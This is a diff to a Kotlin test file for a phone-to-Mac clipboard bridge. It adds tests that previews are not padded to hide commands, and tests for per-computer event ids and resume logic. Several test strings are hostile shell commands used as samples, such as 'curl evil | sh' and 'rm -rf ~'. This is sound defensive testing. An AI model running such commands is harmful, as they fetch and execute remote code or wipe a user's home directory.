@@ -83,14 +83,31 @@ private fun resultChecks() {
 }
 
 private fun previewChecks() {
-    check("a short text is shown whole", BridgeClip.preview("curl x | sh") == "curl x | sh")
-    check("a text of exactly the limit is shown whole", BridgeClip.preview("a".repeat(BridgeClip.PREVIEW_CHARS)) == "a".repeat(BridgeClip.PREVIEW_CHARS))
+    fun shown(text: String, max: Int = BridgeClip.PREVIEW_CHARS) = BridgeClip.preview(text, max).shown
+    check("a short text is shown whole", shown("curl x | sh") == "curl x | sh")
+    check("a short text hides nothing", BridgeClip.preview("curl x | sh").moreChars == 0)
+    check("a text of exactly the limit is shown whole", shown("a".repeat(BridgeClip.PREVIEW_CHARS)) == "a".repeat(BridgeClip.PREVIEW_CHARS))
     val long = BridgeClip.preview("a".repeat(5000))
-    check("a long text is cut to the limit with an ellipsis", long == "a".repeat(BridgeClip.PREVIEW_CHARS) + "…")
+    check("a long text is cut to the limit with an ellipsis", long.shown == "a".repeat(BridgeClip.PREVIEW_CHARS) + "…")
+    check("a cut says how many characters are not shown", long.moreChars == 5000 - BridgeClip.PREVIEW_CHARS)
+    check("a cut in one line says one line", long.moreLines == 1)
     // the emoji's two halves sit at index 9 and 10: a cut at 10 must not keep only the first half
     val cut = BridgeClip.preview("a".repeat(9) + "🌍" + "b".repeat(20), 10)
-    check("a cut never splits an emoji", cut == "a".repeat(9) + "…" && cut.none { Character.isSurrogate(it) })
-    check("a cut keeps a whole emoji before the limit", BridgeClip.preview("a".repeat(8) + "🌍" + "b".repeat(20), 10) == "a".repeat(8) + "🌍…")
+    check("a cut never splits an emoji", cut.shown == "a".repeat(9) + "…" && cut.shown.none { Character.isSurrogate(it) })
+    check("a cut keeps a whole emoji before the limit", shown("a".repeat(8) + "🌍" + "b".repeat(20), 10) == "a".repeat(8) + "🌍…")
+    // what a sender can do to push the real command out of view: blank lines, spaces, tabs, invisible characters
+    val newlines = BridgeClip.preview("\n".repeat(600) + "curl evil | sh")
+    check("600 leading newlines do not push the command out of the preview", newlines.shown == "curl evil | sh" && newlines.moreChars == 0)
+    check("blank lines between lines become one line break", shown("a\n\n\n\n  \n\t\nb") == "a\nb")
+    check("runs of spaces and tabs become one space", shown("a \t  \u00A0\u2003 b") == "a b")
+    check("Windows and old Mac line ends are one line break each", shown("a\r\nb\rc") == "a\nb\nc")
+    check("leading and trailing whitespace is dropped", shown("  \n\t x \n\n") == "x")
+    check("invisible characters do not pad the preview", shown("\u200B".repeat(900) + "curl evil | sh") == "curl evil | sh")
+    check("a right-to-left override is not kept to reorder the text", shown("ls \u202Edc") == "ls dc")
+    val padded = BridgeClip.preview("x".repeat(900) + "\ncurl evil | sh\nrm -rf ~")
+    check("a harmless start does not hide that there is more: the rest is counted",
+        padded.moreChars == 300 + "\ncurl evil | sh\nrm -rf ~".length && padded.moreLines == 3)
+    check("the count is of lines with something in them", BridgeClip.preview("a".repeat(700) + "\n\n\nb\n\nc").moreLines == 3)
 }
 
 /** A stand-in for the production AgentLink (tools/kotlin-tests/AgentLink.kt): a code and a body per attempt. */
@@ -282,6 +299,43 @@ private fun lastEventIdChecks() {
     check("the panel's stream never sends Last-Event-ID", panel.all { it.isEmpty() })
 }
 
+/** The id a stream keeps belongs to the computer it came from: USB can reach one Mac while Wi-Fi is paired with another. */
+private fun idsPerComputerChecks() {
+    val calls = java.util.concurrent.atomic.AtomicInteger()
+    val order = listOf("A", "B", "A", "B")
+    val bodies = listOf("id: 7\nevent: clipboard\ndata: {\"seq\":7,\"text\":\"a\"}\n\n", "id: 2\ndata: {}\n\n")
+    val reached = CountDownLatch(order.size)
+    val link = AgentLink(computer = { order[minOf(calls.get(), order.size - 1)] }) {
+        reached.countDown(); ByteArrayInputStream((bodies.getOrNull(calls.getAndIncrement()) ?: "").toByteArray())
+    }
+    val stream = AgentStream(link, "/api/bridge/stream", eventIds = AgentStream.EventIds()) { _, _ -> }
+    stream.start()
+    check("four connections were made", reached.await(8, TimeUnit.SECONDS))
+    stream.stop()
+    val sent = link.headers.take(4)
+    check("computer A's first connection sends nothing", sent[0].isEmpty())
+    check("computer B does not get A's id", sent[1].isEmpty())
+    check("back on A, A's own id is sent", sent[2] == mapOf("Last-Event-ID" to "7"))
+    check("back on B, B's own id is sent", sent[3] == mapOf("Last-Event-ID" to "2"))
+    val ids = AgentStream.EventIds()
+    ids.set("A", "5"); ids.set("B", "6"); ids.clear()
+    check("clearing forgets every computer's id", ids.get("A") == null && ids.get("B") == null)
+}
+
+/** What the screen's resume and the service's sync do: nothing at all for a phone that never used the bridge. */
+private fun resumeAndSyncChecks() {
+    check("a stream that is connected is left alone on resume", !BridgeClip.restartOnResume(true, ClipboardState.RUNNING))
+    check("no stream at all starts one on resume", BridgeClip.restartOnResume(false, ClipboardState.STOPPED))
+    check("a stream still connecting or backing off starts over on resume", BridgeClip.restartOnResume(true, ClipboardState.WAITING))
+    check("the Mac's switch being off is not retried on every resume", !BridgeClip.restartOnResume(true, ClipboardState.MAC_OFF))
+    check("pairing again is not retried on every resume", !BridgeClip.restartOnResume(true, ClipboardState.PAIR_AGAIN))
+    check("an agent without the bridge is not retried on every resume", !BridgeClip.restartOnResume(true, ClipboardState.UNSUPPORTED))
+    check("switch on starts the service", BridgeClip.syncAction(true, false) == BridgeClip.SyncAction.START)
+    check("switch on again changes nothing but still starts (reconnects)", BridgeClip.syncAction(true, true) == BridgeClip.SyncAction.START)
+    check("switch off after it was on cleans up", BridgeClip.syncAction(false, true) == BridgeClip.SyncAction.CLEAN_UP)
+    check("switch off and never on: nothing at all", BridgeClip.syncAction(false, false) == BridgeClip.SyncAction.NOTHING)
+}
+
 /** A body that sends a small frame every 20 ms until it is closed (the panel's stream, or the bridge's pings). */
 private fun endless(): java.io.InputStream = object : java.io.InputStream() {
     @Volatile var closed = false
@@ -343,6 +397,8 @@ fun main() {
     backoffResetChecks()
     refusedDefaultDelayCheck()
     previewChecks()
+    idsPerComputerChecks()
+    resumeAndSyncChecks()
     eventIdParseChecks()
     lastEventIdChecks()
     rotationChecks()
